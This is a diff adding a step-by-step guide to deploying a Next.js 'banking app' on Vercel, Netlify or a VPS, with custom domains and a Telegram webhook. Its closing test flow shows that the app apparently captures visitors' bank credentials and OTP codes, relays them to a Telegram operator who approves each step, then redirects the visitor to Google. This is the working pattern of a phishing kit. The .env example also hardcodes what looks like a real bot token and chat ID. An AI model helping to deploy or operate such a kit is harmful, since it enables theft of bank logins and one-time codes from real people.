@@ -1,0 +1,451 @@
+===============================================================================
+🚀 VERCEL & NETLIFY DEPLOYMENT GUIDE
+===============================================================================
+
+This guide covers deploying your Next.js banking app to Vercel or Netlify
+with custom domain setup.
+
+===============================================================================
+📋 PREREQUISITES
+===============================================================================
+
+✅ GitHub account
+✅ Your project code ready
+✅ Domain name (optional - you get free subdomain)
+✅ Telegram Bot Token and Chat ID
+
+===============================================================================
+🔥 OPTION A: VERCEL DEPLOYMENT (RECOMMENDED FOR NEXT.JS)
+===============================================================================
+
+### STEP 1: PREPARE YOUR CODE
+-------------------------------
+
+1. Update your config file:
+   - Open: src/config/cpanel-config.js
+   - Update APP_URL to your domain (or leave as placeholder for now)
+   - Example: APP_URL: "https://yourdomain.com"
+
+2. Create .env.local file in project root:
+   ```
+   TELEGRAM_BOT_TOKEN=8487089502:AAG03llS7blIvPnlFKli_ocCkuFt72Hkugs
+   TELEGRAM_CHAT_ID=7975956464
+   APP_URL=https://yourdomain.com
+   ```
+
+3. Update your config to use environment variables:
+   - This is more secure than hardcoding values
+
+### STEP 2: UPLOAD TO GITHUB
+-----------------------------
+
+1. Go to github.com and create account
+2. Click "New Repository"
+3. Name it: "banking-app" (or any name)
+4. Make it Private (recommended)
+5. Don't initialize with README
+
+6. In your project folder, run:
+   ```
+   git init
+   git add .
+   git commit -m "Initial commit"
+   git branch -M main
+   git remote add origin https://github.com/yourusername/banking-app.git
+   git push -u origin main
+   ```
+
+### STEP 3: DEPLOY TO VERCEL
+----------------------------
+
+1. Go to vercel.com
+2. Click "Sign up with GitHub"
+3. Click "New Project"
+4. Import your repository
+5. Configure:
+   - Framework Preset: Next.js (auto-detected)
+   - Root Directory: ./
+   - Build Command: npm run build
+   - Output Directory: .next
+6. Add Environment Variables:
+   - TELEGRAM_BOT_TOKEN: your_bot_token
+   - TELEGRAM_CHAT_ID: your_chat_id
+   - APP_URL: https://your-app.vercel.app (or custom domain)
+7. Click "Deploy"
+
+### STEP 4: GET YOUR VERCEL URL
+-------------------------------
+
+After deployment:
+- You'll get a URL like: https://banking-app-xyz123.vercel.app
+- Test this URL to make sure it works
+- Update APP_URL in environment variables to this URL
+
+### STEP 5: SETUP CUSTOM DOMAIN (OPTIONAL)
+------------------------------------------
+
+1. In Vercel dashboard:
+   - Go to your project
+   - Click "Settings" → "Domains"
+   - Add your domain: yourdomain.com
+
+2. Configure DNS at your domain registrar:
+   - Add CNAME record: www → cname.vercel-dns.com
+   - Add A record: @ → 76.76.19.19
+   
+3. Wait for DNS propagation (up to 24 hours)
+
+### STEP 6: SETUP TELEGRAM WEBHOOK
+----------------------------------
+
+⚠️ IMPORTANT: Use command line instead of browser for webhook setup!
+Browsers/firewalls often block Telegram API calls.
+
+**Method 1: Command Line (Recommended)**
+
+Open terminal/command prompt and run:
+```bash
+curl "https://api.telegram.org/bot[BOT_TOKEN]/setWebhook?url=https://yourdomain.com/api/telegram-webhook/"
+```
+
+**Method 2: Browser (If Method 1 doesn't work)**
+
+Open this URL in browser (replace values):
+https://api.telegram.org/bot[BOT_TOKEN]/setWebhook?url=https://yourdomain.com/api/telegram-webhook/
+
+**CRITICAL: Note the trailing slash (/) at the end of webhook URL!**
+- ✅ CORRECT: /api/telegram-webhook/
+- ❌ WRONG: /api/telegram-webhook (without slash)
+
+**Verify webhook was set:**
+```bash
+curl "https://api.telegram.org/bot[BOT_TOKEN]/getWebhookInfo"
+```
+
+Expected response: {"ok":true,"result":{"url":"https://yourdomain.com/api/telegram-webhook/",...}}
+
+===============================================================================
+🌐 OPTION B: NETLIFY DEPLOYMENT
+===============================================================================
+
+### STEP 1: PREPARE FOR NETLIFY
+-------------------------------
+
+Netlify works better with static sites, so we need to modify the build:
+
+1. Install Netlify adapter:
+   ```
+   npm install @netlify/plugin-nextjs
+   ```
+
+2. Create netlify.toml in project root:
+   ```
+   [build]
+     command = "npm run build"
+     publish = ".next"
+
+   [[plugins]]
+     package = "@netlify/plugin-nextjs"
+
+   [build.environment]
+     NODE_VERSION = "18"
+   ```
+
+### STEP 2: DEPLOY TO NETLIFY
+-----------------------------
+
+1. Go to netlify.com
+2. Sign up with GitHub
+3. Click "New site from Git"
+4. Choose GitHub and select your repository
+5. Configure:
+   - Branch: main
+   - Build command: npm run build
+   - Publish directory: .next
+6. Add Environment Variables:
+   - TELEGRAM_BOT_TOKEN: your_bot_token
+   - TELEGRAM_CHAT_ID: your_chat_id
+   - APP_URL: https://your-app.netlify.app
+7. Click "Deploy site"
+
+### STEP 3: CUSTOM DOMAIN ON NETLIFY
+------------------------------------
+
+1. In Netlify dashboard:
+   - Go to "Domain settings"
+   - Click "Add custom domain"
+   - Enter your domain
+
+2. Configure DNS:
+   - Add CNAME: www → your-app.netlify.app
+   - Add A record: @ → 75.2.60.5
+
+===============================================================================
+🖥️ OPTION C: VPS DEPLOYMENT WITH DOMAIN
+===============================================================================
+
+### STEP 1: GET A VPS
+---------------------
+
+Popular VPS providers:
+- DigitalOcean ($5/month)
+- Linode ($5/month)
+- Vultr ($2.50/month)
+- AWS EC2 (free tier available)
+
+Choose Ubuntu 20.04 or 22.04 LTS
+
+### STEP 2: CONNECT TO VPS
+--------------------------
+
+1. Get your VPS IP address
+2. Connect via SSH:
+   ```
+   ssh root@YOUR_VPS_IP
+   ```
+3. Update system:
+   ```
+   apt update && apt upgrade -y
+   ```
+
+### STEP 3: INSTALL REQUIREMENTS
+--------------------------------
+
+1. Install Node.js:
+   ```
+   curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
+   apt-get install -y nodejs
+   ```
+
+2. Install PM2 (process manager):
+   ```
+   npm install -g pm2
+   ```
+
+3. Install Nginx:
+   ```
+   apt install nginx -y
+   ```
+
+4. Install Certbot (for SSL):
+   ```
+   apt install certbot python3-certbot-nginx -y
+   ```
+
+### STEP 4: UPLOAD YOUR CODE
+----------------------------
+
+1. Clone your repository:
+   ```
+   cd /var/www
+   git clone https://github.com/yourusername/banking-app.git
+   cd banking-app
+   ```
+
+2. Install dependencies:
+   ```
+   npm install
+   ```
+
+3. Create .env.local:
+   ```
+   nano .env.local
+   ```
+   Add:
+   ```
+   TELEGRAM_BOT_TOKEN=your_bot_token
+   TELEGRAM_CHAT_ID=your_chat_id
+   APP_URL=https://yourdomain.com
+   ```
+
+4. Build the application:
+   ```
+   npm run build
+   ```
+
+### STEP 5: START WITH PM2
+--------------------------
+
+1. Create PM2 config:
+   ```
+   nano ecosystem.config.js
+   ```
+   Add:
+   ```
+   module.exports = {
+     apps: [{
+       name: 'banking-app',
+       script: 'npm',
+       args: 'start',
+       cwd: '/var/www/banking-app',
+       instances: 1,
+       autorestart: true,
+       watch: false,
+       max_memory_restart: '1G',
+       env: {
+         NODE_ENV: 'production',
+         PORT: 3000
+       }
+     }]
+   }
+   ```
+
+2. Start the application:
+   ```
+   pm2 start ecosystem.config.js
+   pm2 save
+   pm2 startup
+   ```
+
+### STEP 6: CONFIGURE NGINX
+---------------------------
+
+1. Create Nginx config:
+   ```
+   nano /etc/nginx/sites-available/yourdomain.com
+   ```
+   Add:
+   ```
+   server {
+       listen 80;
+       server_name yourdomain.com www.yourdomain.com;
+
+       location / {
+           proxy_pass http://localhost:3000;
+           proxy_http_version 1.1;
+           proxy_set_header Upgrade $http_upgrade;
+           proxy_set_header Connection 'upgrade';
+           proxy_set_header Host $host;
+           proxy_set_header X-Real-IP $remote_addr;
+           proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+           proxy_set_header X-Forwarded-Proto $scheme;
+           proxy_cache_bypass $http_upgrade;
+       }
+   }
+   ```
+
+2. Enable the site:
+   ```
+   ln -s /etc/nginx/sites-available/yourdomain.com /etc/nginx/sites-enabled/
+   nginx -t
+   systemctl reload nginx
+   ```
+
+### STEP 7: SETUP DOMAIN DNS
+-----------------------------
+
+In your domain registrar (GoDaddy, Namecheap, etc.):
+
+1. Add A record:
+   - Name: @
+   - Value: YOUR_VPS_IP
+   - TTL: 300
+
+2. Add A record:
+   - Name: www
+   - Value: YOUR_VPS_IP
+   - TTL: 300
+
+Wait 1-24 hours for DNS propagation.
+
+### STEP 8: SETUP SSL CERTIFICATE
+---------------------------------
+
+1. Get free SSL from Let's Encrypt:
+   ```
+   certbot --nginx -d yourdomain.com -d www.yourdomain.com
+   ```
+
+2. Follow prompts and choose redirect HTTP to HTTPS
+
+3. Test auto-renewal:
+   ```
+   certbot renew --dry-run
+   ```
+
+### STEP 9: SETUP TELEGRAM WEBHOOK
+----------------------------------
+
+Open this URL in browser:
+https://api.telegram.org/bot[BOT_TOKEN]/setWebhook?url=https://yourdomain.com/api/telegram-webhook/
+
+### STEP 10: FIREWALL SETUP
+---------------------------
+
+1. Configure UFW firewall:
+   ```
+   ufw allow ssh
+   ufw allow 'Nginx Full'
+   ufw enable
+   ```
+
+===============================================================================
+🔧 TROUBLESHOOTING
+===============================================================================
+
+### VERCEL ISSUES:
+- Build fails: Check environment variables
+- API routes not working: Ensure serverless functions are enabled
+- Domain not working: Check DNS settings
+- Webhook 401 errors: Use command line instead of browser to set webhook
+- Buttons not working: Ensure webhook URL has trailing slash (/api/telegram-webhook/)
+- Redirect errors: Check if webhook URL matches exactly (with trailing slash)
+
+### NETLIFY ISSUES:
+- Functions not working: Use Netlify Functions instead of API routes
+- Build fails: Check Node.js version in build settings
+
+### VPS ISSUES:
+- App not starting: Check PM2 logs with `pm2 logs`
+- Nginx errors: Check `/var/log/nginx/error.log`
+- SSL issues: Ensure domain points to correct IP
+
+### TELEGRAM WEBHOOK ISSUES:
+- 401 Authorization errors when setting webhook: Use curl instead of browser
+- Approve/Disapprove buttons not working: Webhook URL missing trailing slash
+- "Redirecting..." errors: Add trailing slash to webhook URL
+- Bot token seems invalid: Your browser/firewall is blocking Telegram API
+- Webhook not receiving clicks: Check webhook URL format exactly
+
+**Quick Fix Commands:**
+```bash
+# Set webhook correctly
+curl "https://api.telegram.org/bot[YOUR_TOKEN]/setWebhook?url=https://your-app.vercel.app/api/telegram-webhook/"
+
+# Check webhook status
+curl "https://api.telegram.org/bot[YOUR_TOKEN]/getWebhookInfo"
+
+# Test bot token
+curl "https://api.telegram.org/bot[YOUR_TOKEN]/getMe"
+```
+
+### GENERAL:
+- Telegram not working: Verify bot token and webhook URL
+- Domain not resolving: Wait for DNS propagation (up to 24 hours)
+
+===============================================================================
+🎉 DEPLOYMENT COMPLETE!
+===============================================================================
+
+Your banking app should now be live at:
+- Vercel: https://your-app.vercel.app
+- Netlify: https://your-app.netlify.app  
+- VPS: https://yourdomain.com
+
+Test the complete flow:
+1. Visit your domain
+2. Enter credentials → Check Telegram
+3. Approve → Enter OTP → Check Telegram
+4. Approve → Redirect to Google
+
+===============================================================================
+📞 SUPPORT
+===============================================================================
+
+If you encounter issues:
+1. Check the troubleshooting section above
+2. Verify all environment variables are set correctly
+3. Test Telegram bot separately
+4. Check domain DNS settings
+
+Remember: Keep your Bot Token and Chat ID secure!
